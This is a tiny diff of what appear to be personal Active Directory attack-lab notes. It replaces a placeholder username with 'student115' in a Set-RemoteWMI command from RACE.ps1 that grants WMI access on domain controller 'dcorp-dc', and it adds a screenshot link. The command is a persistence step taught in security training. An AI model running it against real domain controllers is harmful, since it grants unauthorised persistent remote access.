@@ -537,5 +537,6 @@ Import the RACE.ps1 module
 ```
 And modify the service
 ```powershell
-Set-RemoteWMI -SamAccountName studentx -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
+Set-RemoteWMI -SamAccountName student115 -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
 ```
+![[Pasted image 20231025144401.png]]
